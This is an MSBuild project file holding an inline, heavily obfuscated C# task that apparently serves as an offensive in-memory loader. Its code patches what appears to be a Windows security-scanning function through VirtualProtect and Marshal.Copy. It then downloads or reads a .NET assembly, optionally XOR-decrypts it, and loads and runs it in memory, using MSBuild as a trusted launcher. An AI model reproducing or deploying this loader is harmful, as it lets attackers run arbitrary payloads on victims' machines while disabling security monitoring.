<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample/>
  </Target>
  <UsingTask
  TaskName="ClassExample"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
	      <![CDATA[	  

using System;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Linq;using System.Threading;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class SoullikePrincelier{    private static object[] ErwinPaperhanger = null;
	[DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string ForeteachKlephtism);
	[DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr PrimogenousRicercare, string PhotocatalysisColitoxemia);
	[DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr CaribbeeAssenting, UIntPtr UnstalkedMacroseismic, uint YataliteDeodorizers, out uint DiminuePseudobenthonic);
	private static byte[] OverdroveSilkworks()
    {
        if (!AngiotenosisEndaortitis())
            return Convert.FromBase64String(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("PScBKDZVKgwyNStY"), "HabitanOutjet")));
        return Convert.FromBase64String(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("MTQaLjJdMCw="), "DryopithecinaeNonanimating")));
    }
	private static void PleuralSiderographist()
    {
        IntPtr FuderUmland = OtherwhitherProstatolith(CoxswainedCoked());
        if (FuderUmland != (IntPtr)0)
        {
            Marshal.Copy(OverdroveSilkworks(), 0, FuderUmland, OverdroveSilkworks().Length);
            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("DkU+SSEWFg4TFh0SEAgoDkkeBRgGDDAKQyg/MDxM"), "UncircumventedDwindled")));
        }
        else
        {
            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("D0k8TDwIGxYbOgsEUiQ5JiR0LiAlICwr"), "ThalliousSecretum")));
        }
    }
	private static byte[] PalaeobotanicallySelaginella(byte[] CoreignerNonnourishing, string TridactylLinolein)
    {
        //byte[] keyBytes = Encoding.UTF8.GetBytes(TridactylLinolein);
        byte[] HeptamethyleneUndiurnalBytes = new byte[CoreignerNonnourishing.Length];
        for (int i = 0; i < CoreignerNonnourishing.Length; i++)
        {
            HeptamethyleneUndiurnalBytes[i] = (byte)(CoreignerNonnourishing[i] ^ Encoding.UTF8.GetBytes(TridactylLinolein)[i % Encoding.UTF8.GetBytes(TridactylLinolein).Length]);
        }
        return HeptamethyleneUndiurnalBytes;
    }
	private static bool AngiotenosisEndaortitis()
    {
        if (IntPtr.Size == 4)
            return false;
        return true;
    }
	private static void SpectresHendecagon(byte[] ScrupulouslyAmblystoma)
    {
        HurrahOutedging(GoblinizeCamouflagers(UnmirthfullyNonreinstatement(ScrupulouslyAmblystoma)));
    }
	public static int MetemptosisCatallactics(int HygrologyDerivatively)
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)HygrologyDerivatively;
        return HygrologyDerivatively;
    }
	private static byte[] RereignVitellarium(string url)
    {
        HttpWebRequest LotusGustiness = (HttpWebRequest)WebRequest.Create(url);
        LotusGustiness.Proxy.Credentials = CredentialCache.DefaultCredentials;
        LotusGustiness.Method = Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("BSQn"), "BastardismInferomedian"));
        WebResponse UnconfidedSaddlebill = LotusGustiness.GetResponse();
        MemoryStream ms = new MemoryStream();
        UnconfidedSaddlebill.GetResponseStream().CopyTo(ms);
        return ms.ToArray();
    }
	private static void SuccubineNonene(byte[] ScrupulouslyAmblystoma, string LonglinerPlesiomorphic)
    {
        HurrahOutedging(GoblinizeCamouflagers(UnmirthfullyNonreinstatement(PalaeobotanicallySelaginella(ScrupulouslyAmblystoma, LonglinerPlesiomorphic))));
    }
	private static void MalaiseIndrawing(string AmtracModel, string[] MetatheticallySidings, bool BenedickUnlobedoded = false, string LonglinerPlesiomorphic = "", int PseudogenusesInverisimilitude = 0)
    {
        PleuralSiderographist();
        MetemptosisCatallactics(PseudogenusesInverisimilitude);
        if (!string.IsNullOrEmpty(string.Join(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("aA=="), "HoropterDebars")), MetatheticallySidings))) { 
            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("D1k8VjA+IEoiBCIpTm5S"), "TravellerEvan")) + AmtracModel);
            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("GU4zWi4bCTsCCx4RAUpPUg=="), "BenzoinNonperjuries")) + string.Join(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("aA=="), "HoropterDebars")), MetatheticallySidings));
        }
        else 
        {
           Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("D1k8VjA+IEoiBCIpTm5S"), "TravellerEvan")) + AmtracModel);
           Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("GU4zWi4bCTsCCx4RAUpPUg=="), "BenzoinNonperjuries")) + string.Join(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("aA=="), "HoropterDebars")), MetatheticallySidings));
        }
        ErwinPaperhanger = new object[] { MetatheticallySidings };
        if (BenedickUnlobedoded && AmtracModel.ToLower().StartsWith(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("KxsQFQ=="), "CodeclinationExsibilation"))))
        {
            SuccubineNonene(RereignVitellarium(AmtracModel), LonglinerPlesiomorphic);
        }
        else if (!BenedickUnlobedoded && AmtracModel.ToLower().StartsWith(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("KxsQFQ=="), "CodeclinationExsibilation"))))
        {
            SpectresHendecagon(RereignVitellarium(AmtracModel));
        }
        else if (!BenedickUnlobedoded && !AmtracModel.ToLower().StartsWith(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("KxsQFQ=="), "CodeclinationExsibilation"))))
            SpectresHendecagon(OversplashRelitigation(AmtracModel, FileMode.Open));
        else
            SuccubineNonene(OversplashRelitigation(AmtracModel, FileMode.Open), LonglinerPlesiomorphic);
    }
	private static IntPtr CoxswainedCoked()
    {
        return GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("MwgRCEcQBQI="), "RebaitingMusters"))), Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("FQwQCD4CCQ8hFCMXEBs="), "TacamahacaEquivoke")));
    }
	private static void NosepieceGazeless()
    {
        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("BxYCFRBeRQ=="), "RecrudescenceDrakes")));
        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("BgcOFRxYTzRGMl9FKHMvQgoWEE9TADUQTyhzWR8TDQpPUwk5BxAHKisfEw0KUU8wfQgDEiBUUxAQDA4dEg8IAxIgSjI="), "StorybookPiqu")));
        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("DhtYEUVRW1UJBRoOBgwCBD5PEx8SAkEFJwcPCgwWCRdyBhsXGgYAAS8bCUcdCg0Rcg4ZH1MKFR0jB04XCBANCDcbEAEARQAHI1UMBhoHWlFyChsQHAEEEWg="), "RousseauFungible")));
        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("DxFAERYXW1IjGREaIg8cAAJIEQwhBAAMDQATUgUHARouAAYIAA9BGTsEGUkbDA8THhBFFSQNFxJOCRMIcz0iO1kADxEeEBUHKAVcQSMdEhlzBwhJHwoNHgMeABdtAwtBGgAETQsqP0kdAAIAFRkRGiIPUgoLEU8="), "SemiyearliesMaranham")));
        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("HRdfHwMVHF9TCBMLCQgXLhELTxIABgQeIAYAH0dDCA0WBgEAAAAAZQYNCEkTIBcaQ0IEHREbIABFAQYAIA9SABBBFUUmFz5JTQYFYRcaCkIDHQsSNwtFGQZDLQwTC0w="), "AcrobatesEremic")));
        Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("DhFdExcPFlREPCANCgEHDw0+RQATFwkICxAWIlkWHQwFTCYKUAIEGxZOBQE3DA4LBxUfchEfUhEAAE4IHDEdBgpJAwU8BAILS0goGxcHcBsGTg8OAD4KBxcBSAcXRBI8FUMPGwYZPwAeBhZIAwEWUyQRBk4LCAIzFwlc"), "ReprehendsPycnial")));
    }
	private static object HurrahOutedging(MethodInfo SoftsBallistic)
    {
        if (PardiAuroral(SoftsBallistic) == SoftsBallistic.ReflectedType)
            return SoftsBallistic.Invoke(null, ErwinPaperhanger);
        return ErwinPaperhanger[0];
    }
	private static IntPtr OtherwhitherProstatolith(IntPtr FuderUmland)
    {
        uint PresbyteriallyCodiscoverer = 0;
        if (VirtualProtect(FuderUmland, (UIntPtr)OverdroveSilkworks().Length, 0x40, out PresbyteriallyCodiscoverer))
        {
            return FuderUmland;
        }
        else
        {
            return (IntPtr)0;
        }
    }
	private static Assembly UnmirthfullyNonreinstatement(byte[] IssuancesThinkableness)
    {
        return Assembly.Load(IssuancesThinkableness);
    }
	private static string CaunterCapelets(string CoreignerNonnourishing, bool UncoincidentStenocephalia)
    {
        if (UncoincidentStenocephalia)
            CoreignerNonnourishing = Encoding.UTF8.GetString(Convert.FromBase64String(CoreignerNonnourishing));
        if (CoreignerNonnourishing.Trim().ToLower().Equals(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("PQ=="), "ElectromassageMeaslesproof"))))
            Environment.Exit(0);
        return CoreignerNonnourishing;
    }
	private static MethodInfo GoblinizeCamouflagers(Assembly asm)
    {
        return asm.EntryPoint;
    }
	public static void Main(string[] args)
    {
        int PurifiesLogomachic = (Convert.ToInt32(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("YEFa"), "SynaptosomeCryptoneurous"))) * Convert.ToInt32(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("eg=="), "BerhymingStatorhab"))));
        if (args.Length > 0)
        {
            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("GkwyRRwpBQUtCBsZB0VUSREvGx0bcRVPRiwKHSgsDgkVHg=="), "AmoeboidComplexionist")));
            string LonglinerPlesiomorphic = "";
            string MeteoroliticCheilodipteridae = "";
            string[] DeprecationsOverrunningly = new string[] { };
            bool LabeledFordeal = false;
            bool BenedickUnlobed = false;
            ReicingManyatta();
            foreach (string argument in args)
            {
                if (argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("eEMFWlU="), "UngladlyUninterrupted")) || argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("fg5XXw=="), "SlakableLoanable")))
                {
                    LabeledFordeal = true;
                    Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("Hls0TCgBAkkOHCEUAxEPEDZQCB4MTSwIHAtwVU4RDwcqFAwIRU0KDAwBIggAE0EQLRUETAYDTh0HC2YHAg0="), "EpilimnionFantad")));
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("ZxkbBw=="), "JatulianDar")) || argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("flgaCR4="), "SubfloraSittidae")))
                {
                    BenedickUnlobed = true;
                    int ThunderpealBagworms = Array.IndexOf(args, argument) + 1;
                    if (ThunderpealBagworms < args.Length)
                    {
                        string RewithdrawalInnocently = args[ThunderpealBagworms];
                        if (LabeledFordeal)
                            LonglinerPlesiomorphic = Encoding.UTF8.GetString(Convert.FromBase64String(RewithdrawalInnocently));
                        else
                            LonglinerPlesiomorphic = RewithdrawalInnocently;
                    }
                    Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("D0ozRyIMEBotFRUaHghPNjw0VQk6AhweFh0WDHQHCB0RHRZOBhUcAjNBBQIfSVQTZBhG"), "TangfishTeaspoonsful")), LonglinerPlesiomorphic);
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("Yx8CHz0="), "NockUnmarred")) || argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("fkUVDRgr"), "ShellCubicontravariant")))
                {
                    int ThunderpealBagworms = Array.IndexOf(args, argument) + 1;
                    if (ThunderpealBagworms < args.Length)
                    {
                        string SubfalciformSomniferous = args[ThunderpealBagworms];
                        if (LabeledFordeal)
                            MeteoroliticCheilodipteridae = Encoding.UTF8.GetString(Convert.FromBase64String(SubfalciformSomniferous));
                        else
                            MeteoroliticCheilodipteridae = SubfalciformSomniferous;
                    }
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("eA8BBho="), "UnsailedNomarchies")) || argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("f0IOBg8c"), "RootholdPeeler")))
                {
                    int DefisLovability = Array.IndexOf(args, argument) + 1;
                    int DisoccidentSyllogize = args.Length - DefisLovability;
                    DeprecationsOverrunningly = new String[DisoccidentSyllogize];
                    for (int i = 0; i < DisoccidentSyllogize; i++)
                    {
                        string SubfalciformSomniferousArgs = args[DefisLovability + i];
                        if (LabeledFordeal)
                            DeprecationsOverrunningly[i] = Encoding.UTF8.GetString(Convert.FromBase64String(SubfalciformSomniferousArgs));
                        else
                            DeprecationsOverrunningly[i] = SubfalciformSomniferousArgs;
                    }
                }
            }
            if (string.IsNullOrEmpty(MeteoroliticCheilodipteridae))
            {
                NosepieceGazeless();
                Environment.Exit(0);
            }
            MalaiseIndrawing(MeteoroliticCheilodipteridae, DeprecationsOverrunningly, BenedickUnlobed, LonglinerPlesiomorphic, PurifiesLogomachic);
            Environment.Exit(0);
        }
    }
	private static void ReicingManyatta()
    {
        var UpdatersPreconfined = FootmanMatutinely();
        uint ProtosaurianPharyngological;
        var SupercolossallySphagnaceous = LoadLibrary(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("PR0JBQBHCRkB"), "SimilimumRefresher")));
        var MicrophysicallyAbterminal = GetProcAddress(SupercolossallySphagnaceous, Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("BBoDLAUAHBUaGwQZCg=="), "AntiseraMimmouthedness")));
        if (VirtualProtect(MicrophysicallyAbterminal, (UIntPtr)UpdatersPreconfined.Length, 0x40, out ProtosaurianPharyngological))
        {
            Marshal.Copy(UpdatersPreconfined, 0, MicrophysicallyAbterminal, UpdatersPreconfined.Length);
            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("E0Q6VDoQCg0CIRYKFBkCHUUHBwYIJwQCEEkgPTlG"), "HogtieingRelaundering")));
        }
    }
	private static byte[] FootmanMatutinely()
    {
        if (!AngiotenosisEndaortitis())
            return Convert.FromBase64String(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("JQk3NQ=="), "RaftsmanReallots")));
        return Convert.FromBase64String(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("NhVSTw=="), "AbordSheltering")));
    }
	private static byte[] OversplashRelitigation(string RadioisotopeSportswriter, FileMode FerrihemoglobinLunatical)
    {
        byte[] HeptamethyleneUndiurnal = null;
        using (FileStream fs = new FileStream(RadioisotopeSportswriter, FerrihemoglobinLunatical, FileAccess.Read))
        {
            HeptamethyleneUndiurnal = new byte[fs.Length];
            fs.Read(HeptamethyleneUndiurnal, 0, (int)fs.Length);
        }
        return HeptamethyleneUndiurnal;
    }
	private static bool ZoanthodemicEscadrilles(ConsoleKey LongsomenessEpibranchial)
    {
        if (LongsomenessEpibranchial == ConsoleKey.X)
            Environment.Exit(0);
        return (LongsomenessEpibranchial == ConsoleKey.Y);
    }
	private static Type PardiAuroral(MethodInfo SoftsBallistic)
    {
        return SoftsBallistic.ReflectedType;
    }
	    
	     //This is for MSBuild later
	    public class ClassExample : Task, ITask
	    {
	        public override bool Execute()
	        {
	            SoullikePrincelier.Main(new string[] { });
	            return true;
	        }
	    }
	    
}

 ]]>
	</Code>	  
    </Task>
  </UsingTask>
</Project>